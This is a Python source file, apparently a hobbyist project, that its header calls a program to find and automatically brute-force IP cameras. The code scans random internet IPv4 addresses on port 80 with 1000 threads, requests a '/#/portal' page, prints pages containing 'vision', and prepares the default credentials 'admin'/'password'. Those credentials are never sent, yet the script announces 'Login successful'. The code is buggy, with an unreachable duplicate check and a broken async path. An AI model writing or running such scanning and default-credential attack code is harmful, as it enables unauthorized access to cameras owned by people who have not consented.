# THIS MODULE IS IN THE SAME FOLDER BUT COMPLETELY SEPERATE FROM THE NETSNIFFER FUNCTIONALITY // THE START OF A PROGRAMMING THAT ALLOWS US TO FIND AND AUTOMATICALLY BRUTEFORCES IP CAMERAS


# UI IMPORTS
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
from rich.live import Live
console = Console()


# ETC IMPORTS
from scapy.all import sniff
import socket, ipaddress, threading, random, requests, asyncio, json, time
from requests.auth import HTTPBasicAuth



class camera_hacker():
    """Testing class for the time being"""

    def __init__(self):
        self.ips_created = []
        self.lock = threading.Lock()
        pass
    

    def ip_generator(self):
        """Responsible for making a ip address to then try and connect to"""

        random_ip = (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        # CHECK IF THE IP WAS ALREADY CREATED 
        return random_ip
        valid = any(random_ip == ip for ip in self.ips_created)
        
        while True:
            if valid == False:
                self.ips_created.append(random_ip)
                return random_ip
            
    
    def ip_connection(self):
        """Responsible for attempting a connection to the randomaly generated ip"""
        

        while True:

            # DEFINE THE IP VARIABLE THEN SCAN IT
            ip = self.ip_generator()
            
            # TARGET WEBSERVERS
            port = 80
            
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

                    s.settimeout(.5)
                    response = s.connect_ex((ip, port))

                    if response == 0:
                        
                    #with self.lock:
                        self.check_http(ip)

            except socket.gaierror as e:
                pass
   
            except Exception as e:
                pass
    


    def check_http(self, ip):
        """Responsible for performing a connection attempt to http login page once a active port has been found by the previous method"""
        

        url = f"http://{ip}/#/portal"

        auth=HTTPBasicAuth('admin', 'password')
        
        response = requests.get(url, timeout=3)
        
        try:

            with self.lock:

                if response.status_code == 200:
                    console.print(f"on: {ip}")


                    filter = "vision"
                    
                    
                    if f'{filter}' in response.text.lower():
                        console.print(response.text)
                        console.print(f"[bold green]Login successful: {url}[/bold green]")
                        console.input("\n\nARE U READY:  ")

                

            

        except requests.ConnectionError as e:
            pass
            #console.print(e)


        except Exception as e:
            pass
           # console.print(e)
    

    def threader(self):
        """Threading for ip scanning, will be switching to asyncio soon!"""

        threads = []
        

        for _ in range(1000):

            t = threading.Thread(target=self.ip_connection, daemon=True)
            threads.append(t)
        
        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
    
    async def non_threader(self):
        """Will be the upgraded and more efficient version of using threads excpet no threads LOL // NVM this shii is hard and weird back to threads i go LOL😂"""

        tasks = []

        for _ in range(500):

            task = self.ip_connection()

            tasks.append(task)
        
        await asyncio.gather(*tasks)



main = camera_hacker()

main.threader()
